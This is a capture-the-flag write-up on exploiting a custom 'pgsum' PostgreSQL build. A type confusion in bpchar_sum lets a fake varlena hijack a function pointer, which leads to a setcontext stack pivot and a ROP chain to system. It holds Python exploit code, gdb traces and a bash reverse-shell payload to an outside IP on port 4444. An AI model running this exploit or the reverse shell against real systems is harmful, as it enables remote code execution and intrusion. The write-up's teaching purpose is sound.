# pgsum

Solved by: [Rivit](https://github.com/rivit98), [embedded](https://github.com/embe221ed)

## Description

![intro](./intro.png)

We have added sum support for string to postgresql! Try it out!  
```sql
SELECT
	sum(points)
FROM
	rwctf;
```

Login the database with user `ctf`, password `123qwe!@#QWE`.  


## Analysis

We are given with multiple files:

```
➜  ~/Downloads/pgsum tree                           
.
├── build
│   ├── build.sh
│   └── dockerfile
├── README.md
└── run
    ├── docker-entrypoint.sh
    ├── dockerfile
    ├── flag
    ├── init.sql
    ├── postgres-binary.tar.gz
    ├── readflag
    └── run.sh
```

After checking them we see that author wants us to pwn `postgres 12.17` that was extended by custom functionality. Connecting to the remote gives us a possibility to run arbitrary SQL query, but we cannot create/modify anything.

Unfortunately code changes weren't provided, so we need to figure out them ourselves. That's easy - just compile `postgres` using `Dockerfile` that author provided and do a binary diff:

![bindiff](./bindiff.png)

There were only two functions added - `char_sum` and `varchar_sum`.

```c
__int64 __fastcall char_sum(FunctionCallInfo fcinfo)
{
  bool isnull; // al
  Datum value; // rdx
  __int64 result; // rax

  isnull = fcinfo->args[1].isnull;
  if ( fcinfo->args[0].isnull )
  {
    if ( isnull )
    {
      fcinfo->isnull = 1;
      return 0LL;
    }
    *(double *)&result = (double)SLOBYTE(fcinfo->args[1].value);
  }
  else
  {
    value = fcinfo->args[0].value;
    if ( isnull )
      return (__int64)value;
    *(double *)&result = COERCE_DOUBLE(
                           ((__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))DirectFunctionCall2Coll)(
                             float8pl,
                             0LL,
                             value,
                             (double)SLOBYTE(fcinfo->args[1].value)));
  }
  return result;
}

__int64 __fastcall varchar_sum(FunctionCallInfo fcinfo)
{
  bool isnull; // al
  Datum value; // rbx
  unsigned __int8 *v4; // rax
  _BYTE *v5; // rax
  __int64 v6; // rax
  unsigned __int8 *v7; // rax
  _BYTE *v8; // rax

  isnull = fcinfo->args[1].isnull;
  if ( fcinfo->args[0].isnull )
  {
    if ( isnull )
    {
      fcinfo->isnull = 1;
      return 0LL;
    }
    v7 = (unsigned __int8 *)pg_detoast_datum(fcinfo->args[1].value);
    v8 = text_to_cstring(v7);
    return DirectFunctionCall1Coll(float8in, 0LL, v8);
  }
  else
  {
    value = fcinfo->args[0].value;
    if ( isnull )
      return (__int64)value;
    v4 = (unsigned __int8 *)pg_detoast_datum(fcinfo->args[1].value);
    v5 = text_to_cstring(v4);
    v6 = DirectFunctionCall1Coll(float8in, 0LL, v5);
    return DirectFunctionCall2Coll(float8pl, 0LL, value, v6);
  }
}
```

These functions are similar but... different. They just sum values after trying converting them to doubles. Varchar one uses `pg_detoast_datum` and `text_to_cstring` functions. A bit of googling tells us that functions are related to TOAST'ed data. More can be found in [postgres docs](https://www.postgresql.org/docs/12/storage-toast.html). So...


## Where is a bug?

It turns out that `varchar_sum` is used to sum values of types different from just `varchar`. `char_sum` function is not that interesting. We can lookup postgres functions using `pg_proc` table:

```sql
postgres=> select proname,prosrc from pg_proc where prosrc in ('varchar_sum', 'char_sum');
   proname   |   prosrc    
-------------+-------------
 varchar_sum | varchar_sum
 text_sum    | varchar_sum
 bpchar_sum  | varchar_sum
 bytea_sum   | varchar_sum
 char_sum    | char_sum
(5 rows)
```

We see that sum functions related to types: `bpchar`, `text` and `bytea` are also using `varchar_sum` implementation. Quick look in the docs, and we know that `bpchar` is not a *toastable* type, so probably using `varchar_sum` for it is a bad idea...

Setting a breakpoint at the beginning of `varchar_sum` confirm the thesis (it is important to attach to pid that query `SELECT pg_backend_pid();` returns). Let's see what is being passed to `pg_detoast_datum` after executing the following query: `select bpchar_sum('1', 'AABBCCDD');`

```c
   0x556a617052e8 <varchar_sum+40>    mov    rdi, qword ptr [rdi + 0x30]
 ► 0x556a617052ec <varchar_sum+44>    call   pg_detoast_datum                <pg_detoast_datum>
        rdi: 0x556a637f81b0 ◂— 'AABBCCDD'
        rsi: 0x556a638b44e0 ◂— 0x2
        rdx: 0x556a638b40a0 ◂— 0x3ff0000000000000
        rcx: 0x556a638b4080 —▸ 0x556a638b4030 —▸ 0x556a617052c0 (varchar_sum) ◂— push rbx
```

Cool! We have control over first argument of `pg_detoast_datum` function. Here is the source of it:

```c
struct varlena
{
	char		vl_len_[4];		/* Do not touch this field directly! */
	char		vl_dat[FLEXIBLE_ARRAY_MEMBER];	/* Data content is here */
};

struct varlena *
pg_detoast_datum(struct varlena *datum)
{
	if (VARATT_IS_EXTENDED(datum))
		return heap_tuple_untoast_attr(datum);
	else
		return datum;
}
```

`varlena` is a struct used for representing *toastable* types. `bpchar` is not, so clearly this is a problem here. Now is the time for...

## Exploitation

At this point there is no doubt that we can do *something* with fake `varlena` struct, but we don't know any memory addresses that `postgres` is using. Turns out that this was simpler than we thought. It is enough to crash `postgres` to get a nice stack trace:

```c
postgres=> select bpchar_sum('1', '           AABBCCDD');
ERROR:  	/lib/x86_64-linux-gnu/libc.so.6(+0x1529a0) [0x7f4d470719a0]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(text_to_cstring+0x58) [0x556a61708228]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(varchar_sum+0x39) [0x556a617052f9]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(+0x24ea80) [0x556a614cca80]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(evaluate_expr+0x7a) [0x556a6157ca8a]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(+0x2fec97) [0x556a6157cc97]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(+0x2ff814) [0x556a6157d814]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(expression_tree_mutator+0xc3) [0x556a61518933]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(expression_tree_mutator+0x293) [0x556a61518b03]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(eval_const_expressions+0x38) [0x556a6157e938]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(+0x2e8d28) [0x556a61566d28]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(subquery_planner+0x4d5) [0x556a6156d1c5]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(standard_planner+0x103) [0x556a6156e7e3]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(pg_plan_query+0x28) [0x556a6161c288]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(pg_plan_queries+0x45) [0x556a6161c375]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(+0x39e60d) [0x556a6161c60d]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(PostgresMain+0x1785) [0x556a6161e335]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(+0x32b3e2) [0x556a615a93e2]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(PostmasterMain+0xc91) [0x556a615aa301]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(main+0x483) [0x556a6133e6d3]
	/lib/x86_64-linux-gnu/libc.so.6(+0x271ca) [0x7f4d46f461ca]
	/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0x85) [0x7f4d46f46285]
	postgres: ctf postgres 172.17.0.1(36952) SELECT(_start+0x21) [0x556a6133e791]
```

Good news is that connection wasn't closed, so when we execute next query the addresses will stay the same. ASLR leak? Done. Now is the harder part - memory write.


Diving into a new huge codebase is not an easy task. We tried to focus on `varlena` related functions. It is even worse, a lot of complicated C macros are on our way. Nevertheless, we delved into `pg_detoast_datum` and things that can be called from it. `heap_tuple_untoast_attr` was a first candidate, looks like it is parsing our data and returns freshly allocated memory filled with parsed data. We analyzed almost every branch that was doing memory allocation - nothing fancy. However, there is one branch that calls another parse function on our data - `heap_tuple_fetch_attr`. It has very interesting branch inside:

```c
	else if (VARATT_IS_EXTERNAL_EXPANDED(attr))
	{
		/*
		 * This is an expanded-object pointer --- get flat format
		 */
		ExpandedObjectHeader *eoh;
		Size		resultsize;

		eoh = DatumGetEOHP(PointerGetDatum(attr));
		resultsize = EOH_get_flat_size(eoh);
		result = (struct varlena *) palloc(resultsize);
		EOH_flatten_into(eoh, (void *) result, resultsize);
	}
```

relevant code fragments:
```c
typedef uintptr_t Datum;

#define PointerGetDatum(X) ((Datum) (X))

typedef Size (*EOM_get_flat_size_method) (ExpandedObjectHeader *eohptr);
typedef void (*EOM_flatten_into_method) (ExpandedObjectHeader *eohptr,
										 void *result, Size allocated_size);

typedef struct ExpandedObjectHeader ExpandedObjectHeader;

typedef struct ExpandedObjectMethods
{
	EOM_get_flat_size_method get_flat_size;
	EOM_flatten_into_method flatten_into;
} ExpandedObjectMethods;

typedef struct varatt_expanded
{
	ExpandedObjectHeader *eohptr;
} varatt_expanded;

ExpandedObjectHeader *
DatumGetEOHP(Datum d)
{
	varattrib_1b_e *datum = (varattrib_1b_e *) DatumGetPointer(d);
	varatt_expanded ptr;

	Assert(VARATT_IS_EXTERNAL_EXPANDED(datum));
	memcpy(&ptr, VARDATA_EXTERNAL(datum), sizeof(ptr));
	Assert(VARATT_IS_EXPANDED_HEADER(ptr.eohptr));
	return ptr.eohptr;
}

Size
EOH_get_flat_size(ExpandedObjectHeader *eohptr)
{
	return eohptr->eoh_methods->get_flat_size(eohptr);
}
```

Considering above code - we are able to fully control `ptr` variable in `DatumGetEOHP` function, so effectively we have a control over `get_flat_size` function pointer that is called just after `DatumGetEOHP` leading to arbitrary function call.

In order to call `EOH_get_flat_size` we have to construct our payload in the following way:
- first byte of our payload needs to be set to `0x01` - this is to satisfy `VARATT_IS_EXTERNAL_EXPANDED` macro in `heap_tuple_untoast_attr` function
- second byte has to be `0x02` to pass `VARATT_IS_EXTERNAL_EXPANDED` check and call `DatumGetEOHP`
- six bytes of address that will be copied to `ptr` variable. The trick is that we cannot use null bytes in our payload, so we have to rely on the fact that upper two bytes of pointer will be zeroed (which is not always the case)

Quick look on `EOH_get_flat_size` assembly:
```
pwndbg> disassemble EOH_get_flat_size
Dump of assembler code for function EOH_get_flat_size:
   0x0000556a61659620 <+0>:	mov    rax,QWORD PTR [rdi+0x8]
   0x0000556a61659624 <+4>:	jmp    QWORD PTR [rax]
```

`rdi` is the part that we control. In order to get code execution we have to point `rdi+8` to the address that after dereferencing would give us a function address. Unfortunately we don't know any heap address, so we cannot craft anything on heap. Fortunately, we are able to create and send a huge query string `postgres` will use `malloc` to allocate memory for our string, so if it would be big enough `malloc` will use `mmap` for creating a chunk, and it will be located at known offset from `libc`. We can verify that using the following python code:

```python
import psycopg2
from pwn import *

conn = None

def local():
    global conn
    conn = psycopg2.connect(host="localhost",user="ctf",password="123qwe!@#QWE",dbname="postgres")

def bigchunk():
    conn.commit(); cur = conn.cursor()
    cur.execute(b"SELECT '\\x" + b'aaaaaaaa' * 0x800000 + b"'::bytea, bpchar_sum('1', '           AABBCCDD')")
```

I'm using `ipython` to run commands (it is convenient to work with) - executed commands:

```py
%run solve.py
local()
# now attached gdb to process inside container
bigchunk()
```

then in `gdb`:

```c
pwndbg> search -8 0xaaaaaaaaaaaaaaaa --limit 2
Searching for value: b'\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa'
postgres        0x563513da8cd6 stosb byte ptr [rdi], al
[anon_7f878c54d] 0x7f87945ce04c 0xaaaaaaaaaaaaaaaa
libm.so.6       0x7f87a77471e0 0xaaaaaaaaaaaaaaaa
libm.so.6       0x7f87a7747200 0xaaaaaaaaaaaaaaaa

pwndbg> vmmap libc
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x7f87a74e0000     0x7f87a74e3000 rw-p     3000      0 [anon_7f87a74e0]
►   0x7f87a74e3000     0x7f87a7509000 r--p    26000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f87a7509000     0x7f87a765e000 r-xp   155000  26000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f87a765e000     0x7f87a76b1000 r--p    53000 17b000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f87a76b1000     0x7f87a76b5000 r--p     4000 1ce000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7f87a76b5000     0x7f87a76b7000 rw-p     2000 1d2000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f87a76b7000     0x7f87a76c4000 rw-p     d000      0 [anon_7f87a76b7]

pwndbg> dist 0x7f87a74e3000 0x7f87945ce04c
0x7f87a74e3000->0x7f87945ce04c is -0x12f14fb4 bytes (-0x25e29f7 words)
```

We have our offset now, and we can easily calculate address where our "fake" structure will be stored. Now it is enough to craft it.

First attempt was to call `system` with `/bin/sh` (or `one_gadget` in general). Used the following code (extended python script):

```py
def probe():
    conn.commit(); cur = conn.cursor()

    fake_struct = flat(
        b'/bin/sh\x00',
        p64(rdi+0x10), # point to address below
        p64(libc_base+SYSTEM)
    )

    cur.execute(flat(
        b"SELECT '\\x",
        b'aaaaaaaa' * 0x80000,
        fake_struct.hex().encode(),
        b"'::bytea, bpchar_sum('1', '",
        payload.strip(b'\x00'), # no null bytes allowed
        b"')"
    ))
```

and program crashes here:
```
 ► 0x563514075620 <EOH_get_flat_size>                        mov    rax, qword ptr [rdi + 8]

pwndbg> p/x $rdi
$1 = 0xd2007fc626c1404c
```

`rdi` has wrong MSB - it happens sometimes. To avoid such problem it is enough to just run some random SQL queries before executing our payload.


```py
SYSTEM = 0x4c3a0

def probe():
    conn.commit(); cur = conn.cursor()
    cur.execute(b"SELECT repeat('1s0', 1000)") # fix rdi MSB

    fake_struct = flat(
        b'/bin/sh\x00',
        p64(rdi+0x10), # point to address below
        p64(libc_base+SYSTEM)
    )

    cur.execute(flat(
        b"SELECT '\\x",
        b'deadbeef', # add 4B padding to align rest of payload to 8B
        fake_struct.hex().encode(),
        b'aaaaaaaa' * 0x400000,
        b"'::bytea, bpchar_sum('1', '",
        payload.strip(b'\x00'), # no null bytes allowed
        b"')"
    ))
```

quick check in `gdb`:

```c
 RDI  0x7f879964f050 ◂— 0x68732f6e69622f /* '/bin/sh' */

 ► 0x7f87a752f3a0 <system>                 test   rdi, rdi
```

Cool, but that approach unfortunately will not work - shell is spawned inside main `postgres` process, and we cannot interact with it. Also eight bytes is not enough to store `/readflag\x00` for `system`. The conclusion is that we need to pop a reverse shell, but we have only one function to call. We were looking for some nice gadgets that will allow us to do a `stack pivot` and craft a simple `ROP chain` in our big chunk of memory. We had a hard time finding a good gadget, so we decided to go with `setcontext` libc function.

```c
pwndbg> disassemble setcontext
Dump of assembler code for function setcontext:
   0x00007f87a7523ef0 <+0>:	push   rdi
   0x00007f87a7523ef1 <+1>:	lea    rsi,[rdi+0x128]
   0x00007f87a7523ef8 <+8>:	xor    edx,edx
   0x00007f87a7523efa <+10>:	mov    edi,0x2
   0x00007f87a7523eff <+15>:	mov    r10d,0x8
   0x00007f87a7523f05 <+21>:	mov    eax,0xe
   0x00007f87a7523f0a <+26>:	syscall
   0x00007f87a7523f0c <+28>:	pop    rdx
   0x00007f87a7523f0d <+29>:	cmp    rax,0xfffffffffffff001
   0x00007f87a7523f13 <+35>:	jae    0x7f87a7523f70 <setcontext+128>
   0x00007f87a7523f15 <+37>:	mov    rcx,QWORD PTR [rdx+0xe0]
   0x00007f87a7523f1c <+44>:	fldenv [rcx]
   0x00007f87a7523f1e <+46>:	ldmxcsr DWORD PTR [rdx+0x1c0]
   0x00007f87a7523f25 <+53>:	mov    rsp,QWORD PTR [rdx+0xa0]
   0x00007f87a7523f2c <+60>:	mov    rbx,QWORD PTR [rdx+0x80]
   0x00007f87a7523f33 <+67>:	mov    rbp,QWORD PTR [rdx+0x78]
   0x00007f87a7523f37 <+71>:	mov    r12,QWORD PTR [rdx+0x48]
   0x00007f87a7523f3b <+75>:	mov    r13,QWORD PTR [rdx+0x50]
   0x00007f87a7523f3f <+79>:	mov    r14,QWORD PTR [rdx+0x58]
   0x00007f87a7523f43 <+83>:	mov    r15,QWORD PTR [rdx+0x60]
   0x00007f87a7523f47 <+87>:	mov    rcx,QWORD PTR [rdx+0xa8]
   0x00007f87a7523f4e <+94>:	push   rcx
   0x00007f87a7523f4f <+95>:	mov    rsi,QWORD PTR [rdx+0x70]
   0x00007f87a7523f53 <+99>:	mov    rdi,QWORD PTR [rdx+0x68]
   0x00007f87a7523f57 <+103>:	mov    rcx,QWORD PTR [rdx+0x98]
   0x00007f87a7523f5e <+110>:	mov    r8,QWORD PTR [rdx+0x28]
   0x00007f87a7523f62 <+114>:	mov    r9,QWORD PTR [rdx+0x30]
   0x00007f87a7523f66 <+118>:	mov    rdx,QWORD PTR [rdx+0x88]
   0x00007f87a7523f6d <+125>:	xor    eax,eax
   0x00007f87a7523f6f <+127>:	ret
   0x00007f87a7523f70 <+128>:	mov    rcx,QWORD PTR [rip+0x190e69]        # 0x7f87a76b4de0
   0x00007f87a7523f77 <+135>:	neg    eax
   0x00007f87a7523f79 <+137>:	mov    DWORD PTR fs:[rcx],eax
   0x00007f87a7523f7c <+140>:	or     rax,0xffffffffffffffff
   0x00007f87a7523f80 <+144>:	ret
```

As you can see it has a lot of nice assembly instructions, we can set the `rsp` with value from `[rdx+0xa0]`. Good news is that `rdx` is taken from `rdi`, which points to memory that we control. A bit of shenanigans and we end up with final payload:


```py
SETCONTEXT = 0x40ef0
SYSTEM = 0x4c3a0
POP_RDI = 0x0000000000027765 # : pop rdi ; ret

def exploit():
    conn.commit(); cur = conn.cursor()
    cur.execute(b"SELECT repeat('1s0', 1000)") # fix rdi MSB

    fake_struct = flat(
        b'whatever',
        p64(rdi+0x10), # point to address below
        p64(libc_base+SETCONTEXT),
        b'/bin/bash -c "/bin/sh -i >& /dev/tcp/143.42.7.235/4444 0>&1"   \x00', # padded to 8B
    )

    for v in range(1+8, 0x1d):
        if v == 0x13: # rcx
            # special case - point it to ret
            # it is being pushed on stack later, so we dont want to break our ROP
            fake_struct += p64(libc_base+POP_RDI+1)
            continue
        
        # create values that will be picked by [rdx+X] operations
        # 0x10000 is to move our new rsp a bit further so `system` function stack is able to grow
        fake_struct += p64(rdi+0x70+0x88+0x10000)

    # add padding
    for _ in range(0x10000//8):
        fake_struct += p64(0xDD)

    # ROP
    fake_struct += flat(
        p64(libc_base+POP_RDI+1), # ret to align the stack
        p64(libc_base+POP_RDI),
        p64(rdi+0x18), # reverse shell cmd
        p64(libc_base+SYSTEM),
    )

    cur.execute(flat(
        b"SELECT '\\x",
        b'deadbeef', # add 4B padding to align the rest of payload to 8B
        fake_struct.hex().encode(),
        b'aaaaaaaa' * 0x400000,
        b"'::bytea, bpchar_sum('1', '",
        payload.strip(b'\x00'), # no null bytes allowed
        b"')"
    ))
```

```c
   0x7f87a7523f6d <setcontext+125>    xor    eax, eax
 ► 0x7f87a7523f6f <setcontext+127>    ret                                  <0x7f87a750a766; iconv+198>
    ↓
   0x7f87a750a766 <iconv+198>         ret    
    ↓
   0x7f87a750a766 <iconv+198>         ret    
    ↓
   0x7f87a750a765 <iconv+197>         pop    rdi
   0x7f87a750a766 <iconv+198>         ret    
    ↓
   0x7f87a752f3a0 <system>            test   rdi, rdi
──────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ rsp                             0x7f87995ce140 —▸ 0x7f87a750a766 (iconv+198) ◂— ret 
01:0008│ rbx rcx rdx rdi rsi r14 r15 rbp 0x7f87995ce148 —▸ 0x7f87a750a766 (iconv+198) ◂— ret 
02:0010│+008                             0x7f87995ce150 —▸ 0x7f87a750a765 (iconv+197) ◂— pop rdi
03:0018│+010                             0x7f87995ce158 —▸ 0x7f87995be068 ◂— '/bin/bash -c "/bin/sh -i >& /dev/tcp/143.42.7.235/4444 0>&1"   '
04:0020│+018                             0x7f87995ce160 —▸ 0x7f87a752f3a0 (system) ◂— test rdi, rdi
05:0028│+020                             0x7f87995ce168 ◂— 0xaaaaaaaaaaaaaaaa
... ↓                                    2 skipped
```

Resume code execution and observe a connection to our machine:

```c
\root@localhost:~# nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on XXXXX.dynamic.chello.pl 49276
/bin/sh: 0: can't access tty; job control turned off
$ /readflag
rwctf{2db7c906-ca64-4348-bd2a-97ae482cef47}
```

Final exploit code can be found [here](./solve.py)

Writeup author: [Rivit](https://github.com/rivit98)
